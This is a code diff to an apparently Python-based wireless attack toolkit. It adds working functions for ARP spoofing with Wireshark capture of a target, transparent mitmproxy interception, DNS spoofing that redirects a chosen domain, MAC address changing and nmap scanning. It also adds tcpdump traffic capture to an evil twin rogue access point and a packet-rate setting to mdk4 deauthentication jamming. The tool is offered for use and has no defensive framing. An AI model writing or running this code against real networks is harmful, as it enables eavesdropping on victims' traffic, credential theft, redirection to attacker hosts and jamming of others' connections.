@@ -75,6 +75,16 @@ def main():
                 wifi_packet_sniffing()
             elif command == "scanclients":
                 scan_clients()
+            elif command == "nmap":
+                run_nmap_scan()
+            elif command == "arpspoof":
+                arp_spoofing()
+            elif command == "mac":
+                mac_changer()
+            elif command == "mitm":
+                mitm_proxy()
+            elif command == "dnsspoof":
+                dns_spoof()
             elif command == "clear" or command == "cls":
                 os.system('clear')
             else:
@@ -885,11 +895,15 @@ def evil_twin_attack():
             f.write("log-queries\n")
             f.write("log-dhcp\n")
         
+        print("[*] Preparing interface...")
+        subprocess.run(["airmon-ng", "stop", selected_interface], check=False)
         subprocess.run(["ip", "link", "set", selected_interface, "down"], check=False)
+        subprocess.run(["iw", selected_interface, "set", "type", "managed"], check=False)
         subprocess.run(["ip", "addr", "flush", "dev", selected_interface], check=False)
         subprocess.run(["ip", "addr", "add", "192.168.1.1/24", "dev", selected_interface], check=False)
         subprocess.run(["ip", "link", "set", selected_interface, "up"], check=False)
         
+        print("[*] Setting up routing...")
         subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=False)
         
         subprocess.run(["iptables", "--flush"], check=False)
@@ -900,9 +914,11 @@ def evil_twin_attack():
                       second_interface, "-j", "MASQUERADE"], check=False)
         subprocess.run(["iptables", "--append", "FORWARD", "--in-interface", selected_interface, "-j", "ACCEPT"], check=False)
         
+        print("[*] Starting DHCP server...")
         dnsmasq_proc = subprocess.Popen(["dnsmasq", "-C", "dnsmasq.conf", "-d"])
         current_processes.append(("dnsmasq", dnsmasq_proc))
         
+        print("[*] Starting access point...")
         hostapd_proc = subprocess.Popen(["hostapd", "hostapd.conf"])
         current_processes.append(("hostapd", hostapd_proc))
         
@@ -910,8 +926,16 @@ def evil_twin_attack():
         print(f"[+] Network SSID: {ap_name}")
         if security_option == "y":
             print(f"[+] Password: {password}")
-        print("[*] Press Ctrl+C to stop")
         
+        capture_option = input("\nCapture network traffic? (y/n) [y]: ").strip().lower() or "y"
+        if capture_option == "y":
+            print("[*] Starting network traffic capture...")
+            capture_file = f"eviltwin_capture_{int(time.time())}"
+            tcpdump_proc = subprocess.Popen(["tcpdump", "-i", selected_interface, "-w", f"{capture_file}.pcap"])
+            current_processes.append(("tcpdump", tcpdump_proc))
+            print(f"[+] Capturing traffic to {capture_file}.pcap")
+        
+        print("[*] Press Ctrl+C to stop")
         hostapd_proc.wait()
         
     except KeyboardInterrupt:
@@ -921,7 +945,223 @@ def evil_twin_attack():
     finally:
         stop_process("dnsmasq")
         stop_process("hostapd")
+        stop_process("tcpdump")
         print("[+] Evil Twin AP stopped")
+        print("[*] Restoring network configuration...")
+        subprocess.run(["systemctl", "restart", "NetworkManager"], check=False)
+
+def run_nmap_scan():
+    print("\n[*] Nmap Network Scanner")
+    
+    target = input("Enter target IP/range (e.g., 192.168.1.0/24): ").strip()
+    if not target:
+        print("[!] Target is required")
+        return
+    
+    print("\nScan Type:")
+    print("1. Quick scan (-sS -F)")
+    print("2. Intense scan (-sS -A -T4)")
+    print("3. Comprehensive scan (-sS -sV -sC -A -p-)")
+    print("4. Custom scan")
+    
+    scan_type = input("\nSelect scan type [1]: ").strip() or "1"
+    
+    try:
+        if scan_type == "1":
+            print(f"\n[*] Running quick scan on {target}...")
+            command = ["nmap", "-sS", "-F", target]
+        elif scan_type == "2":
+            print(f"\n[*] Running intense scan on {target}...")
+            command = ["nmap", "-sS", "-A", "-T4", target]
+        elif scan_type == "3":
+            print(f"\n[*] Running comprehensive scan on {target}...")
+            command = ["nmap", "-sS", "-sV", "-sC", "-A", "-p-", target]
+        else:
+            options = input("Enter nmap options: ").strip()
+            command = ["nmap"] + options.split() + [target]
+        
+        output_file = input("\nSave output to file? (leave blank for no): ").strip()
+        if output_file:
+            command.extend(["-oN", output_file])
+        
+        print(f"\n[*] Running: {' '.join(command)}")
+        process = subprocess.Popen(command)
+        current_processes.append(("nmap", process))
+        process.wait()
+        
+    except KeyboardInterrupt:
+        print("\n[*] Stopping nmap scan...")
+    except Exception as e:
+        print(f"[!] Error during nmap scan: {e}")
+    finally:
+        stop_process("nmap")
+        print("[+] Nmap scan completed")
+
+def arp_spoofing():
+    print("\n[*] ARP Spoofing Attack Setup")
+    
+    target = input("Enter target IP: ").strip()
+    if not target:
+        print("[!] Target IP is required")
+        return
+    
+    gateway = input("Enter gateway IP [192.168.1.1]: ").strip() or "192.168.1.1"
+    
+    print("\n[*] Starting ARP spoofing attack...")
+    try:
+        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=False)
+        
+        arpspoof_cmd1 = ["arpspoof", "-i", selected_interface, "-t", target, gateway]
+        arpspoof_cmd2 = ["arpspoof", "-i", selected_interface, "-t", gateway, target]
+        
+        print(f"[*] Running: {' '.join(arpspoof_cmd1)}")
+        process1 = subprocess.Popen(arpspoof_cmd1)
+        current_processes.append(("arpspoof1", process1))
+        
+        print(f"[*] Running: {' '.join(arpspoof_cmd2)}")
+        process2 = subprocess.Popen(arpspoof_cmd2)
+        current_processes.append(("arpspoof2", process2))
+        
+        sniffer_option = input("\nCapture traffic with Wireshark? (y/n) [y]: ").strip().lower() or "y"
+        if sniffer_option == "y":
+            print("[*] Starting Wireshark for traffic analysis...")
+            wireshark_cmd = ["wireshark", "-i", selected_interface, "-k", f"host {target}"]
+            process3 = subprocess.Popen(wireshark_cmd)
+            current_processes.append(("wireshark", process3))
+        
+        print("[*] ARP spoofing attack running. Press Ctrl+C to stop.")
+        process1.wait()
+        
+    except KeyboardInterrupt:
+        print("\n[*] Stopping ARP spoofing attack...")
+    except Exception as e:
+        print(f"[!] Error during ARP spoofing: {e}")
+    finally:
+        stop_process("arpspoof1")
+        stop_process("arpspoof2")
+        stop_process("wireshark")
+        print("[+] ARP spoofing stopped")
+
+def mac_changer():
+    if not check_interface_selected():
+        return
+    
+    print(f"\n[*] MAC Address Changer for {selected_interface}")
+    
+    subprocess.run(["ip", "link", "set", selected_interface, "down"], check=False)
+    
+    print("\nOptions:")
+    print("1. Set random MAC")
+    print("2. Specify custom MAC")
+    print("3. Reset to original MAC")
+    
+    option = input("\nSelect option [1]: ").strip() or "1"
+    
+    try:
+        if option == "1":
+            print("[*] Setting random MAC address...")
+            subprocess.run(["macchanger", "-r", selected_interface], check=False)
+        elif option == "2":
+            mac = input("Enter custom MAC address (XX:XX:XX:XX:XX:XX): ").strip()
+            if not mac:
+                print("[!] MAC address is required")
+                return
+            print(f"[*] Setting MAC address to {mac}...")
+            subprocess.run(["macchanger", "-m", mac, selected_interface], check=False)
+        else:
+            print("[*] Resetting to original MAC address...")
+            subprocess.run(["macchanger", "-p", selected_interface], check=False)
+        
+        subprocess.run(["ip", "link", "set", selected_interface, "up"], check=False)
+        print(f"[+] New MAC address: {get_interface_mac(selected_interface)}")
+        
+    except Exception as e:
+        print(f"[!] Error changing MAC address: {e}")
+        subprocess.run(["ip", "link", "set", selected_interface, "up"], check=False)
+
+def mitm_proxy():
+    if not check_interface_selected():
+        return
+    
+    print("\n[*] MITM Proxy Attack Setup")
+    
+    print("[*] This attack requires ARP spoofing to redirect traffic")
+    run_arp = input("Run ARP spoofing first? (y/n) [y]: ").strip().lower() or "y"
+    
+    if run_arp == "y":
+        arp_spoofing()
+    
+    print("\n[*] Setting up MITM proxy...")
+    
+    proxy_port = input("Enter proxy port [8080]: ").strip() or "8080"
+    
+    try:
+        print("[*] Starting mitmproxy...")
+        mitmproxy_cmd = ["mitmproxy", "-p", proxy_port, "--mode", "transparent"]
+        
+        process = subprocess.Popen(mitmproxy_cmd)
+        current_processes.append(("mitmproxy", process))
+        
+        print(f"[+] MITM proxy running on port {proxy_port}")
+        print("[*] Press Ctrl+C to stop")
+        
+        process.wait()
+        
+    except KeyboardInterrupt:
+        print("\n[*] Stopping MITM proxy...")
+    except Exception as e:
+        print(f"[!] Error during MITM proxy setup: {e}")
+    finally:
+        stop_process("mitmproxy")
+        print("[+] MITM proxy stopped")
+
+def dns_spoof():
+    if not check_interface_selected():
+        return
+    
+    print("\n[*] DNS Spoofing Attack Setup")
+    
+    print("[*] This attack requires ARP spoofing to redirect traffic")
+    run_arp = input("Run ARP spoofing first? (y/n) [y]: ").strip().lower() or "y"
+    
+    if run_arp == "y":
+        arp_spoofing()
+    
+    target_domain = input("\nEnter domain to spoof (e.g., example.com): ").strip()
+    if not target_domain:
+        print("[!] Domain name is required")
+        return
+    
+    redirect_ip = input("Enter IP to redirect to: ").strip()
+    if not redirect_ip:
+        print("[!] Redirect IP is required")
+        return
+    
+    try:
+        hosts_file = "spoofed_hosts.txt"
+        with open(hosts_file, "w") as f:
+            f.write(f"{target_domain} {redirect_ip}\n")
+            
+        print(f"[*] Starting DNS spoofing attack for {target_domain} -> {redirect_ip}...")
+        dnsspoof_cmd = ["dnsspoof", "-f", hosts_file, "-i", selected_interface]
+        
+        process = subprocess.Popen(dnsspoof_cmd)
+        current_processes.append(("dnsspoof", process))
+        
+        print("[+] DNS spoofing attack running")
+        print("[*] Press Ctrl+C to stop")
+        
+        process.wait()
+        
+    except KeyboardInterrupt:
+        print("\n[*] Stopping DNS spoofing attack...")
+    except Exception as e:
+        print(f"[!] Error during DNS spoofing: {e}")
+    finally:
+        stop_process("dnsspoof")
+        if os.path.exists(hosts_file):
+            os.remove(hosts_file)
+        print("[+] DNS spoofing stopped")
 
 def wifi_jamming():
     if not check_interface_selected():
@@ -940,6 +1180,16 @@ def wifi_jamming():
     
     option = input("\nSelect option [1]: ").strip() or "1"
     
+    packet_rate = input("\nEnter packet rate (packets per second, 100-5000) [1000]: ").strip() or "1000"
+    try:
+        packet_rate = int(packet_rate)
+        if packet_rate < 100:
+            packet_rate = 100
+        elif packet_rate > 5000:
+            packet_rate = 5000
+    except:
+        packet_rate = 1000
+    
     try:
         if option == "1":
             channel = input("Enter channel to jam: ").strip()
@@ -955,7 +1205,8 @@ def wifi_jamming():
                 "mdk4", 
                 selected_interface, 
                 "d", 
-                "-c", channel
+                "-c", channel,
+                "-s", str(packet_rate)
             ]
             
         elif option == "2":
@@ -981,7 +1232,8 @@ def wifi_jamming():
                 selected_interface, 
                 "d", 
                 "-b", "target_ap.lst", 
-                "-c", channel
+                "-c", channel,
+                "-s", str(packet_rate)
             ]
             
         else:  
@@ -989,7 +1241,8 @@ def wifi_jamming():
             jam_cmd = [
                 "mdk4", 
                 selected_interface, 
-                "d"
+                "d",
+                "-s", str(packet_rate)
             ]
         
         print(f"\n[*] Running: {' '.join(jam_cmd)}")
@@ -1007,7 +1260,7 @@ def wifi_jamming():
         stop_process("mdk4")
         if os.path.exists("target_ap.lst"):
             os.remove("target_ap.lst")
-        print("[+] Jamming stopped")        
+        print("[+] Jamming stopped")   
 
 def wifi_packet_sniffing():
     if not check_interface_selected():
